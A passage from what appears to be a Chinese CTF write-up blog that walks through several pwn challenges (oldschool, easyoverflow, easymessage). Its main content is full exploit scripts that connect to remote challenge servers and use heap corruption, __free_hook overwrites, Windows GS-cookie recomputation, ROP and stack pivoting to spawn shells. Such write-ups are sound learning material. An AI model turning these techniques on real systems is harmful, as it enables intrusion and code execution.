class="line">    p.sendlineafter(<span class="string">"Offset: "</span>, str(offset))</span><br><span class="line">    p.sendlineafter(<span class="string">"Size: "</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">"Content: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice: "</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">opendir</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice: "</span>, <span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">readdir</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice: "</span>, <span class="string">"5"</span>)</span><br><span class="line"></span><br><span class="line">system_offset = libc.sym[<span class="string">"system"</span>]</span><br><span class="line">__free_hook_offset = libc.sym[<span class="string">"__free_hook"</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0xF8</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0xF8</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0xF8</span>)</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0xF8</span>)</span><br><span class="line"></span><br><span class="line">opendir()</span><br><span class="line">readdir()</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, <span class="number">-8</span>, <span class="number">8</span>, p64(<span class="number">0x4E1</span>))</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x18</span>)</span><br><span class="line">edit(<span class="number">5</span>, <span class="number">-0x7F88</span>, <span class="number">0x28</span>, p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">6</span>, <span class="number">0xF8</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0xF8</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0xF8</span>)</span><br><span class="line">add(<span class="number">9</span>, <span class="number">0xF8</span>)</span><br><span class="line">add(<span class="number">10</span>, <span class="number">0xB8</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">5</span>, <span class="number">-0x7FA8</span> + <span class="number">3</span>, <span class="number">5</span>, <span class="string">'AAAAA'</span>)</span><br><span class="line">readdir()</span><br><span class="line">readdir()</span><br><span class="line">readdir()</span><br><span class="line">p.recvuntil(<span class="string">"AAAAA"</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line">__free_hook = libc_base + __free_hook_offset</span><br><span class="line">libc_system = libc_base + system_offset</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">3</span>, <span class="number">-0x100</span>, <span class="number">8</span>, p64(__free_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">11</span>, <span class="number">0xF8</span>)</span><br><span class="line">edit(<span class="number">11</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">add(<span class="number">12</span>, <span class="number">0xF8</span>)</span><br><span class="line">edit(<span class="number">12</span>, <span class="number">0</span>, <span class="number">8</span>, p64(libc_system))</span><br><span class="line">delete(<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ol><h1 id="oldschool"><a href="#oldschool" class="headerlink" title="oldschool"></a>oldschool</h1><p>这题当时是队里大佬们做的，我只是赛后又做了一遍。</p><h2 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h2><ol><li><p>题目给的是源代码，编译方式<code>Ubuntu 18.04, GCC -m32 -O3</code>，直接看源码会发现没有问题，之前pwnable以及中科大的HackerGame上也有过直接给源码的，反倒是编译后洞更明显。</p></li><li><p>那么直接编译之后，就会发现，<code>mmap_edit</code>有逻辑被优化掉了：</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="number">4</span> * v2 &gt;= <span class="number">0</span> || (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(g_ptr + <span class="number">4</span> * v2) &gt; <span class="number">0xEFFFFFFF</span> )</span><br><span class="line">&#123;</span><br><span class="line">  __printf_chk(<span class="number">1</span>, <span class="string">"Value: "</span>);</span><br><span class="line">  <span class="keyword">if</span> ( __isoc99_scanf(<span class="string">"%u"</span>, &amp;v3) != <span class="number">1</span> )</span><br><span class="line">LABEL_3:</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  *(_DWORD *)(g_ptr + <span class="number">4</span> * v0) = v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 也就是说check不存在了，可以直接写到高地址的libc处了。</p></li><li><p>那么首先填满tcache，然后拿到unsorted bin，利用unsorted bin来leak出libc地址。</p></li><li><p>之后及直接利用<code>mmap_edit</code>写<code>__free_hook</code>为<code>system</code>即可。</p></li><li><p>exp:</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">'106.14.214.3'</span>, <span class="number">2333</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx, size)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice: "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index: "</span>, str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">"Size: "</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice: "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index: "</span>, str(idx))</span><br><span class="line">    p.sendafter(<span class="string">"Content: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice: "</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index: "</span>, str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice: "</span>, <span class="string">"4"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mmap</span><span class="params">(offset)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice: "</span>, <span class="string">"6"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Where do you want to start: "</span>, str(offset))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_map</span><span class="params">(offset, val)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice: "</span>, <span class="string">"7"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index: "</span>, str(offset))</span><br><span class="line">    p.sendlineafter(<span class="string">"Value: "</span>, str(val))</span><br><span class="line"></span><br><span class="line">main_arean_offset = <span class="number">0x1d87a0</span></span><br><span class="line">system_offset = libc.sym[<span class="string">"system"</span>]</span><br><span class="line">__free_hook_offset = libc.sym[<span class="string">"__free_hook"</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x78</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    add(i + <span class="number">1</span>, <span class="number">0x78</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    delete(i + <span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    add(i + <span class="number">1</span>, <span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x78</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">"AAA\n"</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">"AAA\n"</span>)</span><br><span class="line">libc_base = u32(p.recv(<span class="number">4</span>)) - <span class="number">0x38</span> - main_arean_offset</span><br><span class="line">__free_hook = libc_base + __free_hook_offset</span><br><span class="line">libc_system = libc_base + system_offset</span><br><span class="line"></span><br><span class="line">mmap(<span class="number">0</span>)</span><br><span class="line">offset = (__free_hook - <span class="number">0xE0000000</span>) &gt;&gt; <span class="number">2</span></span><br><span class="line">edit_map(offset, str(libc_system))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, <span class="string">"/bin/sh\x00\n"</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ol><h1 id="easyoverflow"><a href="#easyoverflow" class="headerlink" title="easyoverflow"></a>easyoverflow</h1><p>比较简单的一个windows栈溢出，正好最近在学。</p><h2 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h2><ol><li><p>首先栈溢出比较明显：</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  --v10;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;Dst, <span class="number">0</span>, <span class="number">0x100</span>ui64);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"input:"</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;Dst, <span class="number">0x400</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"buffer:"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;Dst);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( v10 &gt; <span class="number">0</span> );</span><br></pre></td></tr></table></figure><p> 也可以看出<code>SEH</code>和<code>SafeSEH</code>都没有，开了<code>GS</code>。</p></li><li><p>其次由于windows的ASLR机制与linux下不同，PIE base和dll base其低2 bytes均为0，而且在短时间内是不会变化的，也就是说第一次leak出来之后，后面可以直接用而不会因连接重置而重置；但是栈地址依然是随机的。</p></li><li><p>那么先统一把栈上面已有的<code>PIE</code>和<code>ntdll</code>上的库函数地址给leak出来，<code>PIE</code>用来return到<code>puts</code>上进行leak，（因为<code>puts</code>函数并不在<code>ntdll</code>里面，而<code>system</code>函数在<code>ucrtbase.dll</code>里面）。</p></li><li><p>至于这个栈上的<code>cookie</code>，从汇编代码中也可以看见：</p> <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>00007FF61C651000                 <span class="keyword">push</span>    <span class="built_in">rbx</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF61C651002                 <span class="keyword">sub</span>     <span class="built_in">rsp</span>, <span class="number">130h</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF61C651009                 <span class="keyword">mov</span>     <span class="built_in">rax</span>, <span class="built_in">cs</span>:__security_cookie</span><br><span class="line"><span class="symbol">.text:</span>00007FF61C651010                 <span class="keyword">xor</span>     <span class="built_in">rax</span>, <span class="built_in">rsp</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF61C651013                 <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+<span class="number">138h</span>+var_18], <span class="built_in">rax</span></span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"><span class="symbol">.text:</span>00007FF61C6510B2                 <span class="keyword">mov</span>     <span class="built_in">rcx</span>, [<span class="built_in">rsp</span>+<span class="number">138h</span>+var_18]</span><br><span class="line"><span class="symbol">.text:</span>00007FF61C6510BA                 <span class="keyword">xor</span>     <span class="built_in">rcx</span>, <span class="built_in">rsp</span>        <span class="comment">; StackCookie</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF61C6510BD                 <span class="keyword">call</span>    __security_check_cookie</span><br></pre></td></tr></table></figure><p> 是先从binary的位置拿出<code>__security_cookie</code>的值，然后和<code>rsp</code>进行异或再写入栈上，退出时同样拿出栈上的<code>cookie</code>与<code>rsp</code>进行异或后再进行和<code>__security_cookie</code>的比较。因此如果<code>rsp</code>发生了变化，不能单纯地使用<code>cookie</code>来填充，而要leak出<code>__security_cookie</code>和<code>cookie</code>计算出<code>rsp</code>地值，再用<code>__security_cookie</code>和新的<code>rsp</code>异或得到新的<code>cookie</code>写入到栈上。</p></li><li><p>后续地就是利用<code>puts</code>将<code>read</code>地地址leak出来，然后计算出<code>ucrtbase</code>的加载地址从而计算出<code>system</code>和<code>cmd.exe</code>的地址，再用rop执行<code>system(&quot;cmd.txt&quot;)</code>，getshell后利用<code>type flag.txt</code>读flag。</p></li><li><p>exp（写得比较复杂，实际那些base地址在leak之后都可以直接用）：</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> winpwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process("./StackOverflow.exe")</span></span><br><span class="line"><span class="comment"># if len(sys.argv) == 2 and sys.argv[1] == '1':</span></span><br><span class="line"><span class="comment">#     windbgx.attach(p)</span></span><br><span class="line">    </span><br><span class="line">p = remote(<span class="string">'39.99.46.209'</span>, <span class="number">13389</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_rsi = <span class="number">0x000000000000cf23</span> <span class="comment"># pop rdi ; pop rsi ; ret</span></span><br><span class="line">pop_rcx = <span class="number">0x000000000009217b</span> <span class="comment"># pop rcx ; ret</span></span><br><span class="line">puts_gadget = <span class="number">0x10A6</span></span><br><span class="line">GS_offset = <span class="number">0x3008</span></span><br><span class="line">read_offset = <span class="number">0x2178</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">0x100</span></span><br><span class="line">p.sendafter(<span class="string">"input:\x0D\x0A"</span>, payload, timeout=<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">"buffer:\x0D\x0A"</span>)</span><br><span class="line">p.recv(<span class="number">0x100</span>)</span><br><span class="line">cookie = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = "A" * 0x118</span></span><br><span class="line"><span class="comment"># p.send(payload)</span></span><br><span class="line"><span class="comment"># p.recvuntil("buffer:")</span></span><br><span class="line"><span class="comment"># p.recvline()</span></span><br><span class="line"><span class="comment"># p.recv(0x118)</span></span><br><span class="line"><span class="comment"># PIE_base = u64(p.recv(6).ljust(8, '\x00')) - 0x12F4</span></span><br><span class="line"><span class="comment"># PIE_base =  0x7ff61c650000</span></span><br><span class="line">PIE_base =  <span class="number">0x7ff6fcba0000</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">0x188</span></span><br><span class="line">p.sendafter(<span class="string">"input:\x0D\x0A"</span>, payload, timeout=<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">"buffer:\x0D\x0A"</span>)</span><br><span class="line">p.recv(<span class="number">0x188</span>)</span><br><span class="line">ntdll_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x6A271</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">0x100</span></span><br><span class="line">payload += p64(cookie)</span><br><span class="line">payload += <span class="string">"A"</span> * <span class="number">8</span></span><br><span class="line">payload += p64(<span class="number">1</span>) <span class="comment"># rbx</span></span><br><span class="line">payload += p64(ntdll_base + pop_rcx) + p64(PIE_base + GS_offset)</span><br><span class="line">payload += p64(PIE_base + puts_gadget)</span><br><span class="line">p.sendafter(<span class="string">"input:\x0D\x0A"</span>, payload, timeout=<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">"buffer:\r\n"</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">GS = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">old_rsp = GS ^ cookie</span><br><span class="line">new_rsp = old_rsp + <span class="number">0x130</span> + <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">0x100</span></span><br><span class="line">payload += p64(GS ^ new_rsp)</span><br><span class="line">payload += <span class="string">"A"</span> * <span class="number">8</span></span><br><span class="line">payload += p64(<span class="number">1</span>) <span class="comment"># rbx</span></span><br><span class="line">payload += p64(ntdll_base + pop_rcx) + p64(PIE_base + read_offset)</span><br><span class="line">payload += p64(PIE_base + puts_gadget)</span><br><span class="line">p.sendafter(<span class="string">"input:\x0D\x0A"</span>, payload, timeout=<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">"buffer:\x0D\x0A"</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">ucrtbase_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x16270</span></span><br><span class="line">system = ucrtbase_base + <span class="number">0xABBA0</span></span><br><span class="line">cmd_exe = ucrtbase_base + <span class="number">0xCC9F0</span></span><br><span class="line"></span><br><span class="line">new_rsp += <span class="number">0x130</span> + <span class="number">0x20</span></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">0x100</span></span><br><span class="line">payload += p64(GS ^ new_rsp)</span><br><span class="line">payload += <span class="string">"A"</span> * <span class="number">8</span></span><br><span class="line">payload += p64(<span class="number">1</span>) <span class="comment"># rbx</span></span><br><span class="line">payload += p64(ntdll_base + pop_rcx) + p64(cmd_exe)</span><br><span class="line">payload += p64(ntdll_base + pop_rdi_rsi) + p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">payload += p64(system)</span><br><span class="line">p.sendafter(<span class="string">"input:\x0D\x0A"</span>, payload, timeout=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"[*] cookie: %s"</span> % hex(cookie))</span><br><span class="line">print(<span class="string">"[*] PIE_base: %s"</span> % hex(PIE_base))</span><br><span class="line">print(<span class="string">"[*] ntdll_base: %s"</span> % hex(ntdll_base))</span><br><span class="line">print(<span class="string">"[*] GS: %s"</span> % hex(GS))</span><br><span class="line">print(<span class="string">"[*] ucrtbase_base: %s"</span> % hex(ucrtbase_base))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ol><h1 id="easymessage"><a href="#easymessage" class="headerlink" title="easymessage"></a>easymessage</h1><h2 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h2><ol><li><p>最开始的时候<code>Leave message</code>可以溢出<code>8 bytes</code>覆盖<code>rbp</code>，先输入<code>name</code>为一个大于<code>256</code>的值，然后利用溢出控制<code>rbp - 4</code>指向<code>bss</code>上<code>name</code>的内存区域：</p> <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400985</span>                 <span class="keyword">cmp</span>     [<span class="built_in">rbp</span>+var_4], <span class="number">100h</span></span><br><span class="line"><span class="symbol">.text:</span>000000000040098C                 <span class="keyword">jle</span>     short loc_400995</span><br><span class="line"><span class="symbol">.text:</span>000000000040098E                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+var_4], <span class="number">100h</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400995</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400995</span> loc_400995:                             <span class="comment">; CODE XREF: work+72↑j</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400995</span>                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">rbp</span>+var_4]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400998</span>                 <span class="keyword">mov</span>     <span class="built_in">edi</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>000000000040099A                 <span class="keyword">call</span>    leave_message</span><br></pre></td></tr></table></figure></li><li><p>第二次<code>Leave message</code>就可以输入<code>0x100</code>的<code>payload</code>，直接写入<code>write</code>的gadgets来leak libc ，以及<code>read</code>的gadget来向<code>bss</code>上读入第二段<code>rop</code>，同时stack pivot到写入第二段<code>rop</code>的位置处</p></li><li><p>之后写入 system(“/bin/sh”) 的 gadget 即可。</p></li><li><p>exp：</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">'123.56.170.202'</span>, <span class="number">21342</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leave_name</span><span class="params">(name)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice: "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendafter(<span class="string">'name: '</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leave_message</span><span class="params">(message)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice: "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendafter(<span class="string">'message: '</span>, message)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice: "</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'says: '</span>)</span><br><span class="line"></span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">write_offset = libc.sym[<span class="string">'write'</span>]</span><br><span class="line">system_offset = libc.sym[<span class="string">"system"</span>]</span><br><span class="line">str_bin_sh_offset = libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x0000000000400646</span> <span class="comment"># ret</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400ac3</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">pop_rsi = <span class="number">0x0000000000400ac1</span> <span class="comment"># pop rsi ; pop r15 ; ret</span></span><br><span class="line">leave_ret = <span class="number">0x0000000000400886</span> <span class="comment"># leave ; ret</span></span><br><span class="line">gadget_1 = <span class="number">0x400AA0</span></span><br><span class="line">gadget_2 = <span class="number">0x400AB6</span></span><br><span class="line">bss = elf.bss(<span class="number">0x600</span>)</span><br><span class="line"></span><br><span class="line">leave_name(<span class="string">"\x70"</span> * <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">0x8</span> + p64(<span class="number">0x6010D0</span> + <span class="number">4</span>)</span><br><span class="line">leave_message(payload + <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">0x8</span> + p64(<span class="number">0</span>)</span><br><span class="line">payload += flat([gadget_2, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, write_got, <span class="number">1</span>, write_got, <span class="number">0x8</span>])</span><br><span class="line">payload += 